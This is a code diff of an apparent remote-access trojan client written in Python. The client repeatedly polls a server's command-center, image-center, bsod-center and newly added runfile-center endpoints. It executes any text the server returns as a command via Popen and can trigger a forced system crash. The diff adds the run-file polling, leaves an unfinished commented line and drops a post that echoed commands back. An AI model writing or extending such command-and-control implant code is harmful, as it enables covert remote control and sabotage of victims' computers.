@@ -1,5 +1,5 @@
 from PIL import UnidentifiedImageError, Image
-from requests import Response, post, get
+from requests import Response, get
 from subprocess import Popen
 from time import sleep
 from os import remove
@@ -22,12 +22,14 @@ def main() -> None:
         get_commands_response = get(f"{SCHEME}://{IP}:{PORT}/command-center")
         get_images_response = get(f"{SCHEME}://{IP}:{PORT}/image-center")
         get_bsod_response = get(f"{SCHEME}://{IP}:{PORT}/bsod-center")
+        get_run_file_response = get(f"{SCHEME}://{IP}:{PORT}/runfile-center")
         if get_commands_response.status_code == 200:
             run_command(get_commands_response)
         if get_images_response.status_code == 200:
             load_image(get_images_response)
         if get_bsod_response.status_code == 200:
             invoke_bsod()
+        # if get_run_file_response = get()
         sleep(DELAY)
 
 
@@ -43,10 +45,6 @@ def load_image(get_images_response: Response):
 
 def run_command(get_commands_response: Response):
     Popen(get_commands_response.text)
-    post(
-        f"{SCHEME}://{IP}:{PORT}/command-center",
-        data={"command": get_commands_response.text},
-    )
 
 
 if __name__ == "__main__":
